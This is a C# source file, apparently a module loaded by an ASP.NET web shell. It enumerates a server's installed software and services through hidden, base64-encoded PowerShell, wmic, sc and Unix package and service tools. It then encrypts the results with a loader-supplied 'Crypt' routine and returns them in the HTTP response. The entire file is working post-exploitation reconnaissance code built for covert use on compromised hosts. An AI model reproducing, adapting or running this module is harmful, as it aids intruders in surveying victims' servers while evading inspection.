using System;
using System.Web;
using System.IO;
using System.Diagnostics;
using System.Text;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Threading;
using System.Text.RegularExpressions;

public class app_serv
{
    private Dictionary<string, string> fnParseParams(string szParam)
    {
        Dictionary<string, string> dic = new Dictionary<string, string>();
        if (string.IsNullOrEmpty(szParam))
            return dic;

        string[] pairs = szParam.Split('&');
        foreach (string szPair in pairs)
        {
            int nIdx = szPair.IndexOf("=");
            if (nIdx > 0)
                dic[szPair.Substring(0, nIdx).Trim()] = szPair.Substring(nIdx + 1).Trim();
        }
        return dic;
    }

    private string fnB64Encode(string szInput) => Convert.ToBase64String(Encoding.UTF8.GetBytes(szInput));
    private string fnB64Decode(string szInput) => Encoding.UTF8.GetString(Convert.FromBase64String(szInput));

    private void fnWriteOutput(object driver, HttpResponse response, byte[] abOutput)
    {
        var cryptMethod = driver.GetType().GetMethod("Crypt", new Type[] { typeof(byte[]), typeof(int) });
        byte[] abEncryptedResp = (byte[])cryptMethod.Invoke(driver, new object[] { abOutput, 1 });

        response.Clear();
        response.ContentType = "application/octet-stream";
        response.BinaryWrite(abEncryptedResp);
    }

    private bool IsWindows()
    {
        string szOs = Environment.OSVersion.Platform.ToString().ToLower();
        if (szOs.Contains("win"))
            return true;
        
        return Path.DirectorySeparatorChar == '\\';
    }

    private bool CommandExists(string szCmd)
    {
        try
        {
            bool bIsWin = IsWindows();
            string szCheckCmd = bIsWin ? $"/c where {szCmd} 2>NUL" : $"-c \"which {szCmd} 2>/dev/null\"";
            string szFileName = bIsWin ? "cmd.exe" : "/bin/sh";

            ProcessStartInfo psi = new ProcessStartInfo(szFileName, szCheckCmd);
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;

            using (Process p = Process.Start(psi))
            {
                p.WaitForExit();
                return p.ExitCode == 0;
            }
        }
        catch
        {
            return false;
        }
    }

    private string RunNativeCommand(string szFileName, string szArgs)
    {
        StringBuilder sb = new StringBuilder();
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo(szFileName, szArgs);
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            
            psi.StandardOutputEncoding = IsWindows() ? Encoding.Default : Encoding.UTF8;

            using (Process p = Process.Start(psi))
            {
                using (StreamReader reader = p.StandardOutput)
                {
                    sb.Append(reader.ReadToEnd());
                }
                p.WaitForExit();
            }
        }
        catch {}
        return sb.ToString();
    }

    private string RunPowerShell(string szQuery)
    {
        try
        {
            string szCmd = $"[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; " +
                           $"$OutputEncoding = [System.Text.Encoding]::UTF8; " +
                           $"{szQuery} | ConvertTo-Json -Depth 3 -Compress";

            string szB64Cmd = Convert.ToBase64String(Encoding.Unicode.GetBytes(szCmd));
            
            ProcessStartInfo psi = new ProcessStartInfo("powershell.exe", $"-NoProfile -EncodedCommand {szB64Cmd}");
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            psi.StandardOutputEncoding = Encoding.UTF8;

            using (Process p = Process.Start(psi))
            {
                string szRes = p.StandardOutput.ReadToEnd().Trim();
                p.WaitForExit();
                
                if (string.IsNullOrEmpty(szRes)) return "[]";
                if (szRes.StartsWith("{") && szRes.EndsWith("}")) return "[" + szRes + "]";
                return szRes;
            }
        }
        catch
        {
            return "[]";
        }
    }

    private string GetWindowsApplications(bool bCanUsePS)
    {
        if (bCanUsePS)
        {
            string szPsQuery = "Get-ChildItem 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall', 'HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall' -ErrorAction SilentlyContinue " +
                               "| ForEach-Object { try { Get-ItemProperty $_.PSPath -ErrorAction Stop } catch {} } " +
                               "| Where-Object {$_.DisplayName} " +
                               "| Select-Object @{N='name';E={$_.DisplayName}}, @{N='version';E={$_.DisplayVersion}}, @{N='vendor';E={$_.Publisher}}, @{N='installed';E={$_.InstallDate}}, @{N='source';E={'powershell_registry'}}";
            string szPsRes = RunPowerShell(szPsQuery);
            if (szPsRes != "[]" && !string.IsNullOrEmpty(szPsRes)) return szPsRes;
        }

        if (CommandExists("wmic"))
        {
            string szWmicOut = RunNativeCommand("cmd.exe", "/c wmic product get Name,Version,Vendor,InstallDate /format:csv 2>NUL");
            StringBuilder json = new StringBuilder("[");
            bool bFirst = true;
            string[] lines = szWmicOut.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
            foreach (string szLine in lines)
            {
                string szTrimmed = szLine.Trim();
                if (string.IsNullOrEmpty(szTrimmed) || szTrimmed.StartsWith("Node,")) continue;
                string[] cols = szTrimmed.Split(',');
                if (cols.Length >= 5)
                {
                    string szName = cols[2].Trim();
                    if (!string.IsNullOrEmpty(szName))
                    {
                        if (!bFirst) json.Append(",");
                        json.Append("{")
                            .Append("\"name\":\"").Append(EscapeJson(szName)).Append("\",")
                            .Append("\"version\":\"").Append(EscapeJson(cols[4].Trim())).Append("\",")
                            .Append("\"vendor\":\"").Append(EscapeJson(cols[3].Trim())).Append("\",")
                            .Append("\"installed\":\"").Append(EscapeJson(cols[1].Trim())).Append("\",")
                            .Append("\"source\":\"wmic\"")
                            .Append("}");
                        bFirst = false;
                    }
                }
            }
            json.Append("]");
            return json.ToString();
        }
        return "[]";
    }

    private string GetWindowsServices(bool bCanUsePS)
    {
        if (bCanUsePS)
        {
            string szPsQuery = "Get-Service | ForEach-Object { [PSCustomObject]@{ name = $_.Name; display_name = $_.DisplayName; status = if($_.Status -eq 'Running'){$_.'running'}else{$_.'stopped'}; start_type = $_.StartType.ToString(); source = 'powershell' } }";
            string szPsRes = RunPowerShell(szPsQuery);
            if (szPsRes != "[]" && !string.IsNullOrEmpty(szPsRes)) return szPsRes;
        }

        if (CommandExists("wmic"))
        {
            string szWmicOut = RunNativeCommand("cmd.exe", "/c wmic service get Name,DisplayName,State,StartMode /format:csv 2>NUL");
            StringBuilder json = new StringBuilder("[");
            bool bFirst = true;
            string[] lines = szWmicOut.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
            foreach (string szLine in lines)
            {
                string szTrimmed = szLine.Trim();
                if (string.IsNullOrEmpty(szTrimmed) || szTrimmed.StartsWith("Node,")) continue;
                string[] cols = szTrimmed.Split(',');
                if (cols.Length >= 5)
                {
                    string szName = cols[2].Trim();
                    if (!string.IsNullOrEmpty(szName))
                    {
                        if (!bFirst) json.Append(",");
                        string szStatus = cols[4].Trim().ToLower() == "running" ? "running" : "stopped";
                        json.Append("{")
                            .Append("\"name\":\"").Append(EscapeJson(szName)).Append("\",")
                            .Append("\"display_name\":\"").Append(EscapeJson(cols[1].Trim())).Append("\",")
                            .Append("\"status\":\"").Append(szStatus).Append("\",")
                            .Append("\"start_type\":\"").Append(EscapeJson(cols[3].Trim())).Append("\",")
                            .Append("\"source\":\"wmic\"")
                            .Append("}");
                        bFirst = false;
                    }
                }
            }
            json.Append("]");
            if (lines.Length > 1) return json.ToString();
        }

        if (CommandExists("sc"))
        {
            string szScOut = RunNativeCommand("cmd.exe", "/c sc query state= all type= service 2>NUL");
            StringBuilder json = new StringBuilder("[");
            bool bFirst = true;
            string szCurrName = "", szCurrDisp = "", szCurrStat = "stopped";
            string[] lines = szScOut.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);

            foreach (string szLine in lines)
            {
                string szTrimmed = szLine.Trim();
                if (szTrimmed.StartsWith("SERVICE_NAME:"))
                {
                    if (!string.IsNullOrEmpty(szCurrName))
                    {
                        if (!bFirst) json.Append(",");
                        json.Append(BuildServiceJson(szCurrName, szCurrDisp, szCurrStat, "unknown", "sc"));
                        bFirst = false;
                    }
                    szCurrName = szTrimmed.Substring(13).Trim(); szCurrDisp = ""; szCurrStat = "stopped";
                }
                else if (szTrimmed.StartsWith("DISPLAY_NAME:"))
                {
                    szCurrDisp = szTrimmed.Substring(13).Trim();
                }
                else if (szTrimmed.StartsWith("STATE") && szTrimmed.ToUpper().Contains("RUNNING"))
                {
                    szCurrStat = "running";
                }
            }
            if (!string.IsNullOrEmpty(szCurrName))
            {
                if (!bFirst) json.Append(",");
                json.Append(BuildServiceJson(szCurrName, szCurrDisp, szCurrStat, "unknown", "sc"));
            }
            json.Append("]");
            return json.ToString();
        }
        return "[]";
    }

    private string GetUnixLikeApplications()
    {
        StringBuilder json = new StringBuilder("[");
        bool bFirst = true;

        if (CommandExists("dpkg-query"))
        {
            string szOut = RunNativeCommand("/bin/sh", "-c \"dpkg-query -W -f='${Package}\\t${Version}\\t${Maintainer}\\n' 2>/dev/null\"");
            string[] lines = szOut.Split(new[] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries);
            foreach (string szLine in lines)
            {
                string[] parts = szLine.Trim().Split('\t');
                if (parts.Length >= 2)
                {
                    if (!bFirst) json.Append(",");
                    json.Append(BuildAppJson(parts[0], parts[1], parts.Length > 2 ? parts[2] : "", "", "dpkg"));
                    bFirst = false;
                }
            }
        }
        else if (CommandExists("rpm"))
        {
            string szOut = RunNativeCommand("/bin/sh", "-c \"rpm -qa --qf '%{NAME}\\t%{VERSION}-%{RELEASE}\\t%{VENDOR}\\n' 2>/dev/null\"");
            string[] lines = szOut.Split(new[] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries);
            foreach (string szLine in lines)
            {
                string[] parts = szLine.Trim().Split('\t');
                if (parts.Length >= 2)
                {
                    if (!bFirst) json.Append(",");
                    json.Append(BuildAppJson(parts[0], parts[1], parts.Length > 2 ? parts[2] : "", "", "rpm"));
                    bFirst = false;
                }
            }
        }

        if (CommandExists("brew"))
        {
            string szOut = RunNativeCommand("/bin/sh", "-c \"brew list --versions 2>/dev/null\"");
            string[] lines = szOut.Split(new[] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries);
            foreach (string szLine in lines)
            {
                string[] parts = szLine.Trim().Split(' ');
                if (parts.Length >= 2)
                {
                    if (!bFirst) json.Append(",");
                    json.Append(BuildAppJson(parts[0], parts[1], "Homebrew", "", "homebrew"));
                    bFirst = false;
                }
            }
        }

        if (CommandExists("snap"))
        {
            string szOut = RunNativeCommand("/bin/sh", "-c \"snap list 2>/dev/null\"");
            string[] lines = szOut.Split(new[] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries);
            for (int i = 1; i < lines.Length; i++)
            {
                string[] cols = Regex.Split(lines[i].Trim(), @"\s+");
                if (cols.Length >= 2)
                {
                    if (!bFirst) json.Append(",");
                    json.Append(BuildAppJson(cols[0], cols[1], cols.Length > 4 ? cols[4] : "", "", "snap"));
                    bFirst = false;
                }
            }
        }

        json.Append("]");
        return json.ToString();
    }

    private string GetUnixLikeServices()
    {
        StringBuilder json = new StringBuilder("[");
        bool bFirst = true;

        if (CommandExists("systemctl"))
        {
            string szOut = RunNativeCommand("/bin/sh", "-c \"systemctl list-units --type=service --all --no-pager --no-legend 2>/dev/null\"");
            string[] lines = szOut.Split(new[] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries);
            foreach (string szLine in lines)
            {
                string[] cols = Regex.Split(szLine.Trim(), @"\s+", RegexOptions.None);
                if (cols.Length >= 4)
                {
                    if (!bFirst)
                        json.Append(",");
                    string szName = cols[0].Replace(".service", "");
                    string szDisp = cols.Length > 4 ? cols[4] : cols[0];
                    string szStatus = cols[2] == "active" ? "running" : "stopped";
                    json.Append(BuildServiceJson(szName, szDisp, szStatus, "", "systemd"));
                    bFirst = false;
                }
            }
        }
        else if (CommandExists("service"))
        {
            string szOut = RunNativeCommand("/bin/sh", "-c \"service --status-all 2>/dev/null\"");
            string[] lines = szOut.Split(new[] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries);
            Regex r = new Regex(@"\[\s*([+\-\?])\s*\]\s+(.+)");
            foreach (string szLine in lines)
            {
                Match m = r.Match(szLine.Trim());
                if (m.Success)
                {
                    if (!bFirst) json.Append(",");
                    string szStatus = m.Groups[1].Value == "+" ? "running" : "stopped";
                    string szName = m.Groups[2].Value.Trim();
                    json.Append(BuildServiceJson(szName, szName, szStatus, "", "sysvinit"));
                    bFirst = false;
                }
            }
        }
        else if (CommandExists("launchctl"))
        {
            string szOut = RunNativeCommand("/bin/sh", "-c \"launchctl list 2>/dev/null\"");
            string[] lines = szOut.Split(new[] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries);
            for (int i = 1; i < lines.Length; i++)
            {
                string[] cols = Regex.Split(lines[i].Trim(), @"\s+", RegexOptions.None);
                if (cols.Length >= 3)
                {
                    if (!bFirst) json.Append(",");
                    string szPid = cols[0];
                    string szLabel = cols[2];
                    bool bIsRunning = szPid != "-" && Regex.IsMatch(szPid, @"\d+");
                    json.Append(BuildServiceJson(szLabel, szLabel, bIsRunning ? "running" : "stopped", "", "launchd"));
                    bFirst = false;
                }
            }
        }

        json.Append("]");
        return json.ToString();
    }

    private string BuildAppJson(string szName, string szVer, string szVendor, string szInst, string szSrc)
    {
        return "{\"name\":\"" + EscapeJson(szName) + "\","
             + "\"version\":\"" + EscapeJson(szVer) + "\","
             + "\"vendor\":\"" + EscapeJson(szVendor) + "\","
             + "\"installed\":\"" + EscapeJson(szInst) + "\","
             + "\"source\":\"" + szSrc + "\"}";
    }

    private string BuildServiceJson(string szName, string szDisp, string szStat, string szType, string szSrc)
    {
        return "{\"name\":\"" + EscapeJson(szName) + "\","
             + "\"display_name\":\"" + EscapeJson(string.IsNullOrEmpty(szDisp) ? szName : szDisp) + "\","
             + "\"status\":\"" + szStat + "\","
             + "\"start_type\":\"" + EscapeJson(szType) + "\","
             + "\"source\":\"" + szSrc + "\"}";
    }

    private string EscapeJson(string szInput)
    {
        if (string.IsNullOrEmpty(szInput)) return "";
        StringBuilder sb = new StringBuilder();
        foreach (char ch in szInput)
        {
            switch (ch)
            {
                case '\\': sb.Append("\\\\"); break;
                case '"':  sb.Append("\\\""); break;
                case '\b': sb.Append("\\b");  break;
                case '\f': sb.Append("\\f");  break;
                case '\n': sb.Append("\\n");  break;
                case '\r': sb.Append("\\r");  break;
                case '\t': sb.Append("\\t");  break;
                case '/':  sb.Append("\\/");  break;
                default:
                    if (ch >= 0 && ch <= 0x1F)
                    {
                        sb.Append("\\u").Append(((int)ch).ToString("X4"));
                    }
                    else
                    {
                        sb.Append(ch);
                    }
                    break;
            }
        }
        return sb.ToString();
    }

    private string CollectSystemData()
    {
        bool bIsWin = IsWindows();
        StringBuilder json = new StringBuilder();
        json.Append("{\n");
        json.Append("  \"success\": true,\n");
        json.Append("  \"system_type\": \"" + (bIsWin ? "windows" : "unix_like") + "\",\n");
        json.Append("  \"os_raw\": \"" + EscapeJson(Environment.OSVersion.ToString()) + "\",\n");
        json.Append("  \"error\": \"\",\n");
        json.Append("  \"data\": {\n");

        if (bIsWin)
        {
            bool bCanUsePS = CommandExists("powershell");
            json.Append("    \"applications\": ").Append(GetWindowsApplications(bCanUsePS)).Append(",\n");
            json.Append("    \"services\": ").Append(GetWindowsServices(bCanUsePS)).Append("\n");
        }
        else
        {
            json.Append("    \"applications\": ").Append(GetUnixLikeApplications()).Append(",\n");
            json.Append("    \"services\": ").Append(GetUnixLikeServices()).Append("\n");
        }

        json.Append("  }\n");
        json.Append("}");
        return json.ToString();
    }

    public bool Run()
    {
        HttpContext context = HttpContext.Current;
        if (context == null)
            return false;

        HttpRequest request = context.Request;
        HttpResponse response = context.Response;

        try
        {
            byte[] abPayload = (byte[])context.Items["payload"];
            object driver = context.Items["driver"];
            int nDllLength = (int)context.Items["len"];

            string szResultJson = CollectSystemData();
            byte[] abOutput = Encoding.UTF8.GetBytes(szResultJson);

            fnWriteOutput(driver, response, abOutput);
        }
        catch (Exception ex)
        {
            string szErr = "{\"success\":false,\"error\":\"" + EscapeJson(ex.Message) + "\",\"data\":{\"applications\":[],\"services\":[]}}";
            try 
            { 
                fnWriteOutput(context.Items["driver"], response, Encoding.UTF8.GetBytes(szErr)); 
            } 
            catch {}
        }

        return true;
    }
}